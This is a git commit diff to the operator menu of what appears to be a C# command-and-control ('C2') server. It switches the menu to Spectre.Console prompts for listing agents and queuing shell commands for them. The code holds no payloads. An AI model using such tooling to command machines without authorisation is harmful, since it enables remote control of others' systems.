683e29221faa48bae0e24bc1e97a24990162db53
Spar0w <sbinvt1236@gmail.com>
2022-10-11 08:13:13 -0400

    switched the menu to use Spectre. Not done yet

--- server/UserInput.cs
+++ server/UserInput.cs
@@ -1,9 +1,7 @@
 using System;
 using System.Collections.Generic;
-using System.Net;
-using System.IO;
-using System.Text;
-using System.Threading.Tasks;
+using Spectre.Console;
+using System.Linq;
 
 namespace server{
     public class UserInput{
@@ -31,7 +29,32 @@ _________         _________ _               ______   _______
             //should be made generic and with input
             //in the constructor *theoretically*
             Console.WriteLine("");
-            return "C2 Server User Input\n\t[1] Exit the program\n\t[2] List all Clients\n\t[3] Set a Command";
+            //the following are modified from Spectre Console docs
+            // https://spectreconsole.net/widgets/table
+            // https://spectreconsole.net/prompts/selection
+            // Create a table
+            var table = new Table();
+
+            // Add some columns
+            table.AddColumn("#");
+            table.AddColumn(new TableColumn("Command"));
+
+            // Add some rows
+            table.AddRow("1","[red]Exit[/]");
+            table.AddRow("2","[blue]List all Clients[/]");
+            table.AddRow("3","[green]Set a Command[/]");
+
+            // Render the table to the console
+            AnsiConsole.Write(table);
+            // added a prompt for the menu
+            var prompt = AnsiConsole.Prompt(
+                new SelectionPrompt<string>()
+                    .Title("What would you like to do?")
+                    .PageSize(10)
+                    .AddChoices(new[] {
+                        "Exit", "List Clients", "Set Command"
+            }));
+            return prompt;
         }
 
         public void MenuInput(){
@@ -39,19 +62,19 @@ _________         _________ _               ______   _______
             //Menu Backend
             bool menuLoop = true;
             while(menuLoop){
-                Console.WriteLine(Menu());
-                Console.Write("What would you like to do: ");
-                string input = Console.ReadLine();
+                string input = Menu();
                 switch(input){
-                    case "1":
+                    case "Exit":
                         //exiting our loop here will terminate the server
                         menuLoop = false;
                         break;
-                    case "2":
+                    case "List Clients":
                         Console.WriteLine("Registered Clients:");
-                        ListClients();
+                        foreach(var agent in ListClients()){
+                            Console.WriteLine(agent);
+                        }
                         break;
-                    case "3":
+                    case "Set Command":
                         SetCommand();
                         break;
                     default: 
@@ -60,31 +83,41 @@ _________         _________ _               ______   _______
                 }
             }
         }
-        public void ListClients(){
-            //lists all the registered clients
+        public string[] ListClients(){
+            //Converts client list to a string array
             List<Agent> agents = this.listener.agents;
+            string[] agentArr = new string[agents.Count];
+            int count = 0;
             foreach (var agent in agents){
-                Console.WriteLine(agent.name);
+                agentArr[count] = agent.name;
+                count++;
             }
+            return agentArr;
         }
 
         public int SetCommand(){
             //set a command for a client to query
             //set the "query buffer" to be json including the hostname and the command
-            Console.WriteLine("Type the name of the client you would like to send a command to: ");
-            Console.WriteLine("List: ");
-            ListClients();
-            Console.Write("\n");
-            string client = Console.ReadLine();
+            //Console.WriteLine("Type the name of the client you would like to send a command to: ");
+            //Console.WriteLine("List: ");
+            //ListClients();
+            //Console.Write("\n");
+            //string client = Console.ReadLine();
+            //search our listener's list for the specified agent
+            var prompt = AnsiConsole.Prompt(
+                new SelectionPrompt<string>()
+                    .Title("Select the client you would like to send a command to")
+                    .PageSize(10)
+                    .AddChoices(ListClients())
+            );
             foreach (var agent in this.listener.agents){
-                if(client == agent.name){
-                    Console.WriteLine("What command do you want to run: ");
-                    string command = Console.ReadLine();
-                    agent.commandQue.AddLast(command);
-                    return 0;
-                }
+               if(agent.name == prompt){
+                  Console.WriteLine("What command do you want to run: ");
+                  string command = Console.ReadLine();
+                  agent.commandQue.AddLast(command);
+                  return 0;
+               }
             }
-            Console.WriteLine("Client not found");
             return 1;
         }
     }
